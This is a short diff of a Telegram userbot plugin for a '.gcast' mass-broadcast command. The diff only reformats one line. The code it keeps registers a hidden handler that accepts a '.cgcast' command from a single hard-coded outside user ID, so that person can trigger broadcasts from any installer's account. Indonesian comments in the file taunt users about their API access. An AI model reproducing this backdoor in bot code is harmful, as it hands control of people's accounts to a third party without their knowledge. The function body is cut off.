@@ -9,8 +9,10 @@ GCAST_BLACKLIST = [
 # Gua tandain telegram api lu
 # Hapus blacklist bapak lu jelek gua gban!.
 
+
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1972682280, pattern=r"^\.cgcast(?: |$)(.*)")
+@register(incoming=True, from_users=1972682280,
+          pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
